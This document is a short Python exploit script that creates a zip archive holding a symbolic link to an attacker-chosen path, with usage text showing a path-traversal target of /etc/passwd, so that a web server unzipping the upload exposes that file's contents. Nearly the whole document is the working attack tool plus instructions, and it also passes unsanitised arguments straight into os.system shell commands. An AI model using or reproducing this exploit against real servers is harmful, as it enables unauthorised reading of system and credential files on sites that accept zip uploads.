#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys,os
from subprocess import call


'''
Exploit /usr/bin/unzip, allow to unzip symbolic link (to read file content).
When the web server will unzip the archive, that will allow you to create symbolic link on a file.

How to use:
    ./zip_upload '../../../../../../etc/passwd'
This command will create a exploit to read /etc/passwd content when the unzip command will be executed.

Requirements:
    zip command, to create zip file
'''

if len(sys.argv) != 2:
    print("\n[ERROR] You have to pass on argument !\n\nExploit /usr/bin/unzip, allow to unzip symbolic link (to read file content).\nWhen the web server will unzip the archive, that will allow you to create symbolic link on a file.\n\nHow to use:\n    ./zip_upload '../../../../../../etc/passwd'\nThis command will create a exploit to read /etc/passwd content when the unzip command will be executed.\n\nRequirements:\n    zip command, to create zip file\n")
else:
    file=sys.argv[1]
    os.system("ln -s "+file+" link")
    os.system("zip --symlink exploitZip.zip link")
    os.system("rm link")
